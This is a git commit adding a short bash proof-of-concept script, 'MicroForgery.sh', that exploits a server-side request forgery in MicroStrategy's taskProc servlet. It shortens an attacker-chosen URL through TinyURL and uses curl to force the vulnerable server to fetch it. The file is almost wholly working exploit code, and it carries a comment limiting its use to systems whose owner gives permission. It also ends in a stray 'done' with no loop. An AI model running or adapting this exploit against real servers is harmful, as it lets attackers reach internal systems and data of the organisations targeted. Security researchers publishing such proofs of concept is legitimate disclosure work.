aa731be697d0f582acaffb95b19c73c0d30712a4
Tony West <47873286+Un4gi@users.noreply.github.com>
2021-03-29 02:45:35 -0700

    Create MicroForgery.sh

---
+++ MicroForgery.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+# MicroForgery taskProc servlet SSRF POC
+# Only for use with express permission of the system owner!
+# Author: Tony West (@Un4gi)
+# un4gi.io | github.com/un4gi | twitter.com/un4gii
+
+if [[ "$1" == "-h" || "$1" == "" || "$2" == "" || "$2" == "-h" ]; then
+    echo "Usage: `MicroForgery $0` vulnerableDomain targetURL"
+    exit 0
+fi
+
+TARGET="https://$1/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=json&srcURL="
+PROTO="http://"
+TINY=$(curl "https://tinyurl.com/api-create.php?url=$2" | awk '{ print substr( $0, 9 ) } ')
+curl -k "$TARGET$PROTO$TINY"
+done
